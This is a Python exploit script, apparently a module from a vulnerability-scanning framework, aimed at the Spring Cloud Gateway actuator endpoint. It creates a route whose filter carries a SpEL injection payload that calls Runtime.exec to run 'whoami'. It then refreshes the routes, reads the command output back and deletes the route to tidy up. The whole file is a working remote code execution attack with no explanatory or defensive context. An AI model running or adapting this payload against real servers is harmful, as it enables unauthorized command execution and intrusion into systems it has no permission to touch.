import requests


def run(host, **kwargs):
    headers = {
        "Content-Type": "application/json"
    }
    payload = '''{\r
          "id": "hacktest",\r
          "filters": [{\r
            "name": "AddResponseHeader",\r
            "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"}\r
            }],\r
          "uri": "http://example.com",\r
          "order": 0\r
        }'''
    url = host + "/actuator/gateway/routes/hacktest"
    req = requests.post(url, headers=headers, data=payload)
    if req.status_code == 201:
        url2 = host + "/actuator/gateway/refresh"
        req2 = requests.post(url2, headers=headers)
        url3 = host + "/actuator/gateway/routes/hacktest"
        req3 = requests.get(url3, headers=headers)
        url4 = host + "/actuator/gateway/routes/hacktest"
        req4 = requests.delete(url4, headers=headers)
        req5 = requests.post(url2, headers=headers)
        if req3.status_code == 200:
            return req3.text
